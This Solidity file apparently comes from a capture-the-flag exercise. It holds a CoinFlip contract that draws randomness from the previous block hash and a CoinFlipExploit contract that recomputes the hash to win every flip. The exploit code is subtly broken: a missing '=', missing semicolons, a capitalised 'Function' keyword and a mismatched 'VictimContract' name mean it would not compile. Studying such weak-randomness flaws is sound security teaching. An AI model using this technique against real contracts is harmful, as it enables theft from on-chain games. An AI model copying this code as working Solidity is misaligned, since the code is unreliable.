pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

// CoinFlip Exploit contract

/* Contract CoinFlipExploit created to mirror the logic of the contract CoinFlip. CoinFlipExploit uses
the resulting boolean to forward the "guess" to CoinFlip flip() function. As a result, the exploit contract
will always win by increasing the consecutiveWins variable. */ 


pragma solidity ^0.6.0;

import "./CoinFlip.sol";

contract CoinFlipExploit {

CoinFlip public victimContract;

uint FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

constructor(address _victimContractAddr) public {

victimContract CoinFlip(_victimContractAddr)

}

Function flip() public returns (bool) {

uint blockValue = uint(blockhash(block.number - 1));

uint coinFlip = uint(blockValue/FACTOR)

bool side = coinFlip == 1 ? true : false; 

VictimContract.flip(side);

}

}
